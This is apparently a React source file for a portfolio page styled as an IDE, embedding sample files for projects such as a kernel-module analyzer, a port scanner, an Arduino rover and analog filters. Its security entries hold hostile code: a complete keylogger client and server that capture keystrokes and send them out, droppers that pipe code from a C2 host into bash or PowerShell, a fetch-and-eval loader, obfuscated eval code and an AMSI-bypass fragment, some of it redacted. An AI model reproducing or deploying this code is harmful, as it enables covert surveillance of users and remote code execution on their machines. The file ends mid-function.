import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Reveal } from "@/components/Reveal";
import {
  Folder, FolderOpen, FileCode2, FileText, FileTerminal, ChevronRight, X,
  Play, Square as Stop, Search, Lock, ExternalLink, Github,
  Activity, TerminalSquare, Tag, Cpu, Network as NetIcon, Bug, ChevronDown, Menu,
} from "lucide-react";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/projects")({
  head: () => ({
    meta: [
      { title: "Projects — Mostafa Galal" },
      { name: "description", content: "Interactive engineering workspace — explore Mostafa Galal's security tooling, embedded systems, and analog projects like a real IDE." },
      { property: "og:title", content: "Projects — Mostafa Galal" },
      { property: "og:description", content: "An IDE-style workspace of security tooling, embedded systems, and analog projects." },
    ],
  }),
  component: ProjectsPage,
});

/* ─────────────────────────────────────────────────────────────────
   Project model
   ───────────────────────────────────────────────────────────────── */

type FileEntry = {
  name: string;
  lang: "md" | "py" | "js" | "bash" | "c" | "ino" | "txt";
  content: string;
};

type Project = {
  id: string;
  name: string;
  domain: "security" | "embedded" | "ai" | "networking";
  status: "active" | "archived" | "in-progress" | "private";
  tags: string[];
  description: string;
  github: string;
  demo: string;
  image: string | null;
  files: FileEntry[];
  /** terminal output simulated when "Run" pressed */
  runCommand: string;
  runOutput: string[];
  vulnLines?: number[]; // line numbers to highlight in first .py/.c file
};

const PROJECTS: Project[] = [
  {
    id: "nm",
    name: "NM Analyzer",
    domain: "security",
    status: "active",
    tags: ["reversing", "elf", "kernel", "static-analysis"],
    description: "Static analysis tool for Linux Kernel Modules using symbol table heuristics to detect malicious patterns.",
    github: "",
    demo: "/assets/nm.mp4",
    image: "/assets/nm_analyzer.png",
    runCommand: "$ python3 nm_analyzer.py rootkit.ko",
    runOutput: [
      "[*] Loading ELF: rootkit.ko (12,304 bytes)",
      "[*] Parsing symbol table (.symtab, .dynsym)...",
      "[+] 87 symbols extracted",
      "[!] HIGH   sys_call_table     → category: Syscall Hooking",
      "[!] HIGH   commit_creds       → category: Privilege Escalation",
      "[!] HIGH   prepare_kernel_cred→ category: Privilege Escalation",
      "[!] MED    kallsyms_lookup    → category: Address Resolution",
      "[*] Risk score: 87/100  (LIKELY MALICIOUS)",
      "[*] Report written: report_rootkit.json",
    ],
    vulnLines: [22, 23, 35],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# NM Analyzer

Static analysis for Linux Kernel Modules (.ko) using symbol-table heuristics.

## Why
LKM rootkits are notoriously hard to spot. Most evade dynamic analysis but still
need *symbols* the kernel can resolve. NM Analyzer parses the ELF symbol table
and bins each symbol into risk categories.

## Categories
- **Syscall Hooking**     — sys_call_table, set_memory_rw, …
- **Privilege Escalation** — commit_creds, prepare_kernel_cred
- **Hiding**               — module_kobject removal, dirent filtering

## Usage
\`\`\`
python3 nm_analyzer.py module.ko
\`\`\`

## Status
Active · adding YARA-style rule packs next.
`,
      },
      {
        name: "nm_analyzer.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""NM Analyzer — symbol-table heuristics for Linux Kernel Modules."""
import sys, json
from pathlib import Path
from elftools.elf.elffile import ELFFile

CATEGORIES = {
    "Syscall Hooking": [
        "sys_call_table", "set_memory_rw", "set_memory_ro",
        "ftrace_set_filter_ip",
    ],
    "Privilege Escalation": [
        "commit_creds", "prepare_kernel_cred",
    ],
    "Hiding": [
        "module_kobject", "kobject_del",
    ],
}

def categorize(symbols):
    findings = []
    for sym in symbols:
        for cat, keys in CATEGORIES.items():
            if any(k in sym for k in keys):
                # NOTE: high-confidence keyword match
                findings.append((sym, cat, "HIGH"))
    return findings

def main(path):
    with open(path, "rb") as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name(".symtab")
        names = [s.name for s in symtab.iter_symbols() if s.name]
        findings = categorize(names)
    score = min(100, len(findings) * 12)
    print(f"[*] Risk score: {score}/100")
    Path(f"report_{Path(path).stem}.json").write_text(
        json.dumps({"findings": findings, "score": score}, indent=2)
    )

if __name__ == "__main__":
    main(sys.argv[1])
`,
      },
      {
        name: "rules.json",
        lang: "txt",
        content: `{
  "syscall_hooking": ["sys_call_table","set_memory_rw"],
  "privesc": ["commit_creds","prepare_kernel_cred"],
  "hiding": ["module_kobject"]
}`,
      },
    ],
  },
  {
    id: "shadow",
    name: "Shadow Core",
    domain: "security",
    status: "private",
    tags: ["framework", "post-exploitation", "private", "staged-delivery"],
    description: "Modular core framework for staged payload delivery and controlled listener orchestration.",
    github: "",
    demo: "",
    image: null,
    runCommand: "$ shadowctl status",
    runOutput: [
      "[!] CLASSIFIED — operator credentials required.",
      "[*] redacted ████████████████████",
      "[*] redacted ████████████████████",
      "[*] redacted ████████████████████",
      "[*] handshake denied · access lvl: PUBLIC",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Shadow Core Framework  ·  CLASSIFIED

Modular framework for staged payload delivery and listener orchestration.

> **NOTICE** — Source and docs are not published. This card exists to record
> the engineering effort. Reach out for a private walkthrough.

## High-level
- Configuration-driven module graph
- Multi-stage delivery (loader → stub → payload)
- Pluggable transports
- Operator audit log

## Tree
\`\`\`
.
├── config.json
├── deploy.sh
├── key.txt
├── listener
│   └── root_listener.py
└── public_html
    ├── index.html
    ├── payload.bin
    ├── stage2.ps1
    └── update.js
\`\`\`

Status: Private.
`,
      },
      {
        name: "config.json",
        lang: "txt",
        content: `{
  "listener_port": 8443,
  "staging": true,
  "transport": "https",
  "beacon_interval": 30
}`,
      },
      {
        name: "deploy.sh",
        lang: "bash",
        content: `#!/bin/bash
# Shadow Core deploy script
set -e
echo "[*] Deploying Shadow Core..."
chmod +x listener/root_listener.py
nohup python3 listener/root_listener.py &
echo "[+] Listener active on port 8443"`,
      },
      {
        name: "key.txt",
        lang: "txt",
        content: `-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED]
-----END OPENSSH PRIVATE KEY-----`,
      },
      {
        name: "listener/root_listener.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Shadow Core — root listener"""
import socket, threading, json

HOST, PORT = "0.0.0.0", 8443

def handle_client(conn, addr):
    print(f"[+] Beacon from {addr}")
    while True:
        data = conn.recv(4096)
        if not data:
            break
        print(f"[*] {data.decode(errors='ignore')}")
    conn.close()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()
`,
      },
      {
        name: "public_html/index.html",
        lang: "txt",
        content: `<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script src="update.js"></script>
</body>
</html>`,
      },
      {
        name: "public_html/stage2.ps1",
        lang: "txt",
        content: `# Stage-2 loader
$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadData("https://cdn.example.com/payload.bin")
# [REDACTED execution chain]`,
      },
      {
        name: "public_html/update.js",
        lang: "js",
        content: `// Staging bootstrap
fetch('/payload.bin')
  .then(r => r.arrayBuffer())
  .then(buf => {
    // [REDACTED]
  });`,
      },
    ],
  },
  {
    id: "payload",
    name: "Payload Generator",
    domain: "security",
    status: "private",
    tags: ["research", "private", "cross-platform", "obfuscation"],
    description: "Multi-platform payload research toolkit for studying delivery mechanisms and obfuscation.",
    github: "",
    demo: "",
    image: null,
    runCommand: "$ python3 payload_generator.py --list",
    runOutput: [
      "[*] Payload Generator v2.1",
      "[*] Available formats:",
      "    [1] windows.payload   — PowerShell dropper",
      "    [2] linux.payload     — ELF stub",
      "    [3] macos.payload     — Mach-O bundle",
      "    [4] python.payload    — PyInstaller",
      "    [5] javascript.payload— Electron wrapper",
      "    [6] powershell.payload— AMSI bypass",
      "[*] Use --format <id> --output <path>",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Payload Generator  ·  CLASSIFIED

Researches payload formats across OSes — generation, lightweight obfuscation,
delivery simulation, and listener-side handling for controlled lab environments.

## Tree
\`\`\`
.
├── index.html
├── payload.js
├── payload.obf.js
├── payload_generator.py
├── payloads
│   ├── javascript.payload
│   ├── linux.payload
│   ├── macos.payload
│   ├── powershell.payload
│   ├── python.payload
│   └── windows.payload
└── root_listener.py
\`\`\`

> Source not published. Lab use only.
`,
      },
      {
        name: "payload_generator.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Payload Generator — multi-format research toolkit"""
import argparse, os, base64
from pathlib import Path

PAYLOADS = Path("payloads")

FORMATS = {
    "windows":   ("windows.payload",   "ps1"),
    "linux":     ("linux.payload",     "sh"),
    "macos":     ("macos.payload",     "command"),
    "python":    ("python.payload",    "py"),
    "javascript":("javascript.payload","js"),
    "powershell":("powershell.payload","ps1"),
}

def generate(fmt, output):
    src, ext = FORMATS[fmt]
    raw = (PAYLOADS / src).read_bytes()
    b64 = base64.b64encode(raw).decode()
    stub = f"# Auto-generated {fmt} payload\n"
    stub += f"import base64\nexec(base64.b64decode('{b64}'))\n"
    Path(f"{output}.{ext}").write_text(stub)
    print(f"[+] Generated {output}.{ext} ({len(stub)} bytes)")

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--list", action="store_true")
    p.add_argument("--format", choices=list(FORMATS.keys()))
    p.add_argument("--output", default="out")
    args = p.parse_args()
    if args.list:
        for k in FORMATS:
            print(f"  [+] {k}")
    elif args.format:
        generate(args.format, args.output)

if __name__ == "__main__":
    main()
`,
      },
      {
        name: "payload.js",
        lang: "js",
        content: `// Payload delivery stub
const net = require('net');
const fs = require('fs');

const client = net.createConnection({ port: 4444, host: '127.0.0.1' }, () => {
  console.log('[*] Connected to listener');
});

client.on('data', (data) => {
  fs.writeFileSync('/tmp/stage2.bin', data);
  // [REDACTED]
});
`,
      },
      {
        name: "payload.obf.js",
        lang: "js",
        content: `eval(function(p,a,c,k,e,d){e=function(c){return c};
if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];
e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 1=2;0 3=4;',5,5,'var|a|1|b|2'.split('|'),0,{}))
`,
      },
      {
        name: "root_listener.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Root listener for generated payloads"""
import socket, threading

PORT = 4444

def handler(c, a):
    print(f"[+] Connection from {a}")
    c.send(b"\x00\x01\x02\x03")
    c.close()

with socket.socket() as s:
    s.bind(("0.0.0.0", PORT))
    s.listen(5)
    print(f"[*] Listening on port {PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handler, args=(conn, addr)).start()
`,
      },
      {
        name: "payloads/windows.payload",
        lang: "txt",
        content: `# Windows dropper stub
# Downloads stage-2 from C2 and executes via rundll32
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://c2/stage2")
iex $data`,
      },
      {
        name: "payloads/linux.payload",
        lang: "txt",
        content: `#!/bin/bash
# Linux ELF stub
curl -s http://c2/stage2 | bash`,
      },
      {
        name: "payloads/macos.payload",
        lang: "txt",
        content: `#!/bin/bash
# macOS bundle stub
curl -s http://c2/stage2 | bash`,
      },
      {
        name: "payloads/python.payload",
        lang: "txt",
        content: `import urllib.request, subprocess
url = "http://c2/stage2"
data = urllib.request.urlopen(url).read()
# [REDACTED]`,
      },
      {
        name: "payloads/javascript.payload",
        lang: "txt",
        content: `fetch("http://c2/stage2")
  .then(r => r.text())
  .then(t => eval(t));`,
      },
      {
        name: "payloads/powershell.payload",
        lang: "txt",
        content: `$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
# [REDACTED AMSI bypass chain]`,
      },
    ],
  },
  {
    id: "telemetry",
    name: "Keylogger Framework",
    domain: "security",
    status: "archived",
    tags: ["keylogger", "client-server", "research", "telemetry"],
    description: "Client-server telemetry framework for capturing and analyzing user input patterns in controlled environments.",
    github: "",
    demo: "",
    image: "/assets/keylogg.png",
    runCommand: "$ python3 server.py --port 9001",
    runOutput: [
      "[*] Keylogger server v1.0",
      "[*] Listening on 0.0.0.0:9001",
      "[+] Client connected: 192.168.1.42",
      "[+] Frame 0001 received  (216 B)",
      "[+] Frame 0002 received  (188 B)",
      "[*] Logging to logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Keylogger Framework

Client-server tool exploring how endpoint telemetry travels and what patterns
can be extracted from raw input streams. **Lab-only.**

## Tree
\`\`\`
.
├── keylogger.py
├── logs
│   ├── http_1d355b50-64eb-43f2-851a-55bfb62061f1.json
│   ├── http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json
│   ├── http_2d99935f-cb1f-48ff-b95a-a62f00166366.json
│   └── http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json
└── server.py
\`\`\`
`,
      },
      {
        name: "keylogger.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Keylogger client — sends keystroke telemetry to server"""
import keyboard, json, requests, threading, time
from datetime import datetime

SERVER = "http://127.0.0.1:9001"
BUFFER = []

def flush():
    if not BUFFER:
        return
    payload = {
        "timestamp": datetime.now().isoformat(),
        "keys": BUFFER.copy(),
        "session": "default"
    }
    try:
        requests.post(SERVER, json=payload, timeout=3)
    except Exception as e:
        print(f"[!] Send failed: {e}")
    BUFFER.clear()

def on_key(event):
    BUFFER.append({"key": event.name, "time": time.time()})
    if len(BUFFER) >= 20:
        flush()

keyboard.on_press(on_key)
threading.Timer(5.0, flush).start()
print("[*] Keylogger active — press Ctrl+C to stop")
keyboard.wait()
`,
      },
      {
        name: "server.py",
        lang: "py",
        content: `#!/usr/bin/env python3
"""Keylogger server — receives and stores telemetry frames"""
import socket, json, uuid, os
from datetime import datetime
from pathlib import Path

HOST, PORT = "0.0.0.0", 9001
LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)

def save_frame(data: bytes):
    uid = str(uuid.uuid4())
    path = LOG_DIR / f"http_{uid}.json"
    try:
        payload = json.loads(data.decode())
        payload["server_time"] = datetime.now().isoformat()
        path.write_text(json.dumps(payload, indent=2))
        print(f"[+] Saved frame → {path.name}")
    except Exception as e:
        print(f"[!] Parse error: {e}")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        print(f"[+] Client connected: {addr[0]}")
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                save_frame(data)
`,
      },
      {
        name: "logs/http_1d355b50-64eb-43f2-851a-55bfb62061f1.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:22:01",
  "keys": [
    {"key": "h", "time": 1713882121.0},
    {"key": "e", "time": 1713882121.1},
    {"key": "l", "time": 1713882121.2},
    {"key": "l", "time": 1713882121.3},
    {"key": "o", "time": 1713882121.4}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:22:02"
}`,
      },
      {
        name: "logs/http_1d3bc93a-f4ad-4364-8b45-ba37e58f9489.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:25:33",
  "keys": [
    {"key": "t", "time": 1713882333.0},
    {"key": "e", "time": 1713882333.1},
    {"key": "s", "time": 1713882333.2},
    {"key": "t", "time": 1713882333.3}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:25:34"
}`,
      },
      {
        name: "logs/http_2d99935f-cb1f-48ff-b95a-a62f00166366.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:28:12",
  "keys": [
    {"key": "ctrl", "time": 1713882492.0},
    {"key": "c", "time": 1713882492.1}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:28:13"
}`,
      },
      {
        name: "logs/http_d3f5bf9d-8697-480b-9d95-10af4b0ab580.json",
        lang: "txt",
        content: `{
  "timestamp": "2025-04-23T14:30:45",
  "keys": [
    {"key": "enter", "time": 1713882645.0}
  ],
  "session": "default",
  "server_time": "2025-04-23T14:30:46"
}`,
      },
    ],
  },
  {
    id: "tcp",
    name: "TCP Full Scan Tool",
    domain: "networking",
    status: "active",
    tags: ["networking", "scanner", "python"],
    description: "Custom TCP-based network scanning tool for analyzing exposed services and port states.",
    github: "",
    demo: "/assets/tcp_full_scan.mp4",
    image: "/assets/tcp_full_scan.png",
    runCommand: "$ python3 tcp_scan.py 10.0.0.5 1-1024",
    runOutput: [
      "[*] Target: 10.0.0.5  ports 1-1024",
      "[*] Threads: 200  timeout: 1.0s",
      "[+] 22/tcp   open    ssh",
      "[+] 80/tcp   open    http",
      "[+] 443/tcp  open    https",
      "[+] 3306/tcp open    mysql",
      "[*] Scan complete in 4.2s — 4 open / 1020 filtered",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# TCP Full Scan

Threaded TCP full-connect scanner. Built to learn the wire — no nmap.

## Usage
\`\`\`
python3 tcp_scan.py <target> <start-end>
\`\`\`

Demonstrates:
- raw socket connect()
- thread-pool concurrency
- timeout / banner grabbing
`,
      },
      {
        name: "tcp_scan.py",
        lang: "py",
        content: `import socket, sys
from concurrent.futures import ThreadPoolExecutor

def probe(host, port, timeout=1.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        try: banner = s.recv(64).decode(errors="ignore").strip()
        except Exception: banner = ""
        return port, True, banner
    except Exception:
        return port, False, ""
    finally:
        s.close()

def main(host, lo, hi):
    open_ports = []
    with ThreadPoolExecutor(max_workers=200) as ex:
        for port, ok, banner in ex.map(lambda p: probe(host, p), range(lo, hi+1)):
            if ok:
                open_ports.append((port, banner))
                print(f"[+] {port}/tcp open  {banner}")
    print(f"[*] {len(open_ports)} open")

if __name__ == "__main__":
    host = sys.argv[1]
    lo, hi = map(int, sys.argv[2].split("-"))
    main(host, lo, hi)
`,
      },
    ],
  },
  {
    id: "vehicle",
    name: "Smart Recon Vehicle",
    domain: "embedded",
    status: "archived",
    tags: ["embedded", "bluetooth", "arduino"],
    description: "A smart vehicle combining embedded systems, automation, and remote Bluetooth control.",
    github: "https://github.com/youssefsalama-11/Smart-Car-Project/blob/main/Smart_Car.ino",
    demo: "",
    image: "/assets/smart.jpeg",
    runCommand: "$ avrdude -p atmega328p -U flash:w:Smart_Car.hex",
    runOutput: [
      "[*] Compiling Smart_Car.ino ...",
      "[*] AVR-GCC: OK  (program: 6,820 bytes)",
      "[*] Uploading via /dev/ttyUSB0 @ 57600",
      "[+] Flash verified ✓",
      "[*] HC-05 paired · ready for AT commands",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Smart Recon Vehicle

Bluetooth-controlled rover with motor-driver IC and laptop-side telemetry.

## Stack
- ATmega328P (Arduino)
- L298N motor driver, 4× DC motors
- HC-05 Bluetooth
- Serial telemetry → Python listener

## Lessons
- PWM tuning for differential drive
- Bluetooth latency vs UART throughput trade-offs
`,
      },
      {
        name: "Smart_Car.ino",
        lang: "ino",
        content: `// Smart_Car.ino — Bluetooth-controlled rover
#include <SoftwareSerial.h>

const int IN1=2, IN2=3, IN3=4, IN4=5, ENA=9, ENB=10;
SoftwareSerial bt(11, 12); // RX, TX (HC-05)

void drive(int l, int r) {
  digitalWrite(IN1, l>0); digitalWrite(IN2, l<0);
  digitalWrite(IN3, r>0); digitalWrite(IN4, r<0);
  analogWrite(ENA, abs(l));
  analogWrite(ENB, abs(r));
}

void setup() {
  pinMode(IN1, OUTPUT); pinMode(IN2, OUTPUT);
  pinMode(IN3, OUTPUT); pinMode(IN4, OUTPUT);
  bt.begin(9600); Serial.begin(9600);
}

void loop() {
  if (bt.available()) {
    char c = bt.read();
    switch (c) {
      case 'F': drive( 200,  200); break;
      case 'B': drive(-200, -200); break;
      case 'L': drive(-180,  180); break;
      case 'R': drive( 180, -180); break;
      case 'S': drive(   0,    0); break;
    }
    Serial.println(c);
  }
}
`,
      },
    ],
  },
  {
    id: "faceblur",
    name: "FaceBlur Live",
    domain: "ai",
    status: "active",
    tags: ["computer-vision", "opencv", "real-time"],
    description: "Real-time computer vision app detecting and blurring faces in live video streams.",
    github: "",
    demo: "/assets/livefaceblur.mp4",
    image: "/assets/livefaceblur.png",
    runCommand: "$ python3 faceblur_live.py",
    runOutput: [
      "[*] Loading Haar cascade: haarcascade_frontalface_default.xml",
      "[*] Capture device: /dev/video0  (1280x720)",
      "[+] Stream started — 28 fps",
      "[+] Face detected (124,88,210,210)  → blurred",
      "[+] Face detected (442,102,200,200) → blurred",
      "[*] Press q to stop",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# FaceBlur Live

Real-time face detection + dynamic blurring on live webcam feed.

## How
- Haar cascades (fast, CPU-only)
- Per-frame Gaussian blur over detected ROIs
- Optional: switch to DNN backend for accuracy
`,
      },
      {
        name: "faceblur_live.py",
        lang: "py",
        content: `import cv2

cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
cap = cv2.VideoCapture(0)

while True:
    ok, frame = cap.read()
    if not ok: break
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    faces = cascade.detectMultiScale(gray, 1.2, 5)
    for (x, y, w, h) in faces:
        roi = frame[y:y+h, x:x+w]
        frame[y:y+h, x:x+w] = cv2.GaussianBlur(roi, (45, 45), 30)
    cv2.imshow("FaceBlur Live", frame)
    if cv2.waitKey(1) & 0xFF == ord("q"): break

cap.release(); cv2.destroyAllWindows()
`,
      },
    ],
  },
  {
    id: "tiktok",
    name: "TikTok Media Downloader",
    domain: "ai",
    status: "archived",
    tags: ["http", "scraper", "python"],
    description: "Lightweight tool for downloading TikTok videos without watermarks or ads.",
    github: "",
    demo: "/assets/tiktok.mp4",
    image: "/assets/tiktok.png",
    runCommand: "$ python3 tk_dl.py https://tiktok.com/@x/video/123",
    runOutput: [
      "[*] Resolving URL ...",
      "[+] Found stream: video_no_wm.mp4 (4.1 MB)",
      "[+] Downloaded → ./out/123.mp4",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# TikTok Media Downloader

Minimal CLI to fetch a TikTok clip without watermark / ad overlay.
Pure HTTP — no Selenium.
`,
      },
    ],
  },
  {
    id: "rlc",
    name: "Series RLC Band-Pass Filter",
    domain: "embedded",
    status: "archived",
    tags: ["analog", "filters", "rlc"],
    description: "Passive band-pass filter using series RLC circuit for precise frequency selection.",
    github: "",
    demo: "/assets/bandpass.mp4",
    image: "/assets/bandpass.png",
    runCommand: "$ ngspice bandpass.cir -b",
    runOutput: [
      "Circuit: Series RLC band-pass",
      "[*] AC analysis 1Hz → 10MHz",
      "  f0 = 1.59 MHz",
      "  Q  = 12.4",
      "  BW = 128 kHz",
      "[*] Pass-band ripple: 0.4 dB",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Series RLC Band-Pass

Passive band-pass: signals around \`f0\` pass, others attenuate.

\`\`\`
f0 = 1 / (2π√LC)
Q  = (1/R)·√(L/C)
BW = f0 / Q
\`\`\`
`,
      },
      {
        name: "bandpass.cir",
        lang: "txt",
        content: `* Series RLC band-pass filter
V1 in 0 AC 1
R1 in n1 50
L1 n1 n2 10u
C1 n2 0 1n
.AC DEC 100 1 10MEG
.PRINT AC V(n2)
.END`,
      },
    ],
  },
  {
    id: "curtain",
    name: "Smart Curtain System",
    domain: "embedded",
    status: "archived",
    tags: ["digital-logic", "gates", "automation"],
    description: "Logic-gate-based smart curtain control system for automated opening and closing.",
    github: "",
    demo: "",
    image: "/assets/curtain.png",
    runCommand: "$ simulate curtain.logic",
    runOutput: [
      "[*] Truth table → 8 states",
      "[*] Inputs:  light_sensor, time_signal, manual_override",
      "[+] Outputs: motor_open, motor_close",
      "[*] Hazard-free Karnaugh: ✓",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Smart Curtain — Pure Gate Logic

No microcontroller. Just AND/OR/NOT gates wired to drive a motor based on
ambient light, time signal, and a manual override.

Designed by Karnaugh-map minimization to be hazard-free.
`,
      },
    ],
  },
  {
    id: "butterworth",
    name: "3rd-Order Butterworth BPF",
    domain: "embedded",
    status: "archived",
    tags: ["analog", "butterworth", "filters"],
    description: "Passive 3rd-order Butterworth band-pass filter with flat passband.",
    github: "",
    demo: "/assets/filter3rd.mp4",
    image: "/assets/butterworth_bpf.jpeg",
    runCommand: "$ ngspice butterworth.cir -b",
    runOutput: [
      "Circuit: 3rd-order Butterworth BPF",
      "[*] f0 = 1.00 MHz   BW = 10 kHz",
      "[*] Pass-band ripple: ~0 dB (maximally flat)",
      "[*] Roll-off: -60 dB/decade",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# 3rd-Order Butterworth Band-Pass

Maximally flat magnitude response. Center 1 MHz, bandwidth 10 kHz.

Filter order trades pass-band flatness for roll-off steepness — 3rd-order
is the sweet spot for most narrowband audio/RF stages.
`,
      },
    ],
  },
];

const DOMAIN_ICON = {
  security: Bug,
  embedded: Cpu,
  ai: Activity,
  networking: NetIcon,
} as const;

const STATUS_COLOR: Record<Project["status"], string> = {
  active: "bg-cyber-cyan",
  "in-progress": "bg-amber-400",
  archived: "bg-muted-foreground",
  private: "bg-cyber-violet",
};

const FILE_ICON = (lang: FileEntry["lang"]) => {
  if (lang === "md") return FileText;
  if (lang === "bash") return FileTerminal;
  return FileCode2;
};

/* ─────────────────────────────────────────────────────────────────
   Tiny syntax highlighter — token-class based, no deps
   ───────────────────────────────────────────────────────────────── */

const KEYWORDS: Record<FileEntry["lang"], string[]> = {
  py: ["def", "import", "from", "if", "elif", "else", "for", "while", "return", "with", "as", "in", "try", "except", "class", "True", "False", "None", "lambda", "and", "or", "not", "pass"],
  js: ["function", "const", "let", "var", "if", "else", "for", "while", "return", "import", "from", "export", "class", "new", "true", "false", "null", "undefined"],
  bash: ["if", "then", "else", "fi", "for", "do", "done", "while", "case", "esac", "function", "return", "in"],
  c: ["int", "void", "char", "float", "double", "if", "else", "for", "while", "return", "struct", "static", "const", "include", "define"],
  ino: ["void", "int", "char", "byte", "boolean", "if", "else", "for", "while", "return", "switch", "case", "break", "const", "include"],
  md: [],
  txt: [],
};

function highlight(line: string, lang: FileEntry["lang"]) {
  if (lang === "md") {
    if (/^#{1,6}\s/.test(line)) return <span className="text-cyber-cyan">{line}</span>;
    if (/^>\s/.test(line)) return <span className="text-muted-foreground italic">{line}</span>;
    if (/^```/.test(line)) return <span className="text-cyber-violet">{line}</span>;
    if (/^- /.test(line)) return <span><span className="text-cyber-violet">- </span>{line.slice(2)}</span>;
    return <span>{line}</span>;
  }
  if (lang === "txt") return <span>{line}</span>;

  const tokens: React.ReactNode[] = [];
  const re = /("[^"]*"|'[^']*'|#[^\n]*|\/\/[^\n]*|\b\d+\b|\b[A-Za-z_][A-Za-z0-9_]*\b|\s+|.)/g;
  let m;
  let i = 0;
  while ((m = re.exec(line)) !== null) {
    const t = m[0];
    let cls = "";
    if (/^"|^'/.test(t)) cls = "text-emerald-400";
    else if (/^#|^\/\//.test(t)) cls = "text-muted-foreground italic";
    else if (/^\d+$/.test(t)) cls = "text-amber-300";
    else if (KEYWORDS[lang].includes(t)) cls = "text-cyber-violet";
    else if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(t) && line[re.lastIndex] === "(") cls = "text-cyber-cyan";
    tokens.push(cls ? <span key={i++} className={cls}>{t}</span> : t);
  }
  return <>{tokens}</>;
}

/* ─────────────────────────────────────────────────────────────────
   Page
   ───────────────────────────────────────────────────────────────── */

function ProjectsPage() {
  const [activeId, setActiveId] = useState<string>(PROJECTS[0].id);
  const [openTabs, setOpenTabs] = useState<Record<string, string[]>>({
    [PROJECTS[0].id]: [PROJECTS[0].files[0].name],
  });
  const [activeTab, setActiveTab] = useState<Record<string, string>>({
    [PROJECTS[0].id]: PROJECTS[0].files[0].name,
  });
  const [expanded, setExpanded] = useState<Set<string>>(new Set(["security"]));
  const [terminalLines, setTerminalLines] = useState<string[]>([
    "Mostafa Galal — workspace v1.0",
    'Type "help" or use the Run button to execute a project.',
    "",
  ]);
  const [running, setRunning] = useState(false);
  const [showPalette, setShowPalette] = useState(false);
  const [paletteQuery, setPaletteQuery] = useState("");
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);

  const activeProject = PROJECTS.find((p) => p.id === activeId)!;
  const tabs = openTabs[activeId] ?? [];
  const currentTab = activeTab[activeId] ?? tabs[0];
  const currentFile = activeProject.files.find((f) => f.name === currentTab) ?? activeProject.files[0];

  /* keyboard shortcuts: Ctrl+P palette, Ctrl+Tab cycle tabs, Esc close palette */
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "p") {
        e.preventDefault();
        setShowPalette(true);
      }
      if (e.key === "Escape") {
        setShowPalette(false);
        setMobileMenuOpen(false);
      }
      if ((e.ctrlKey || e.metaKey) && e.key === "Tab") {
        e.preventDefault();
        const list = openTabs[activeId] ?? [];
        if (list.length > 1) {
          const idx = list.indexOf(currentTab);
          const next = list[(idx + 1) % list.length];
          setActiveTab((p) => ({ ...p, [activeId]: next }));
        }
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [openTabs, activeId, currentTab]);

  const openProject = (id: string) => {
    setActiveId(id);
    setMobileMenuOpen(false);
    const proj = PROJECTS.find((p) => p.id === id)!;
    setOpenTabs((prev) => ({
      ...prev,
      [id]: prev[id] ?? [proj.files[0].name],
    }));
    setActiveTab((prev) => ({
      ...prev,
      [id]: prev[id] ?? proj.files[0].name,
    }));
  };

  const openFile = (name: string) => {
    setOpenTabs((prev) => {
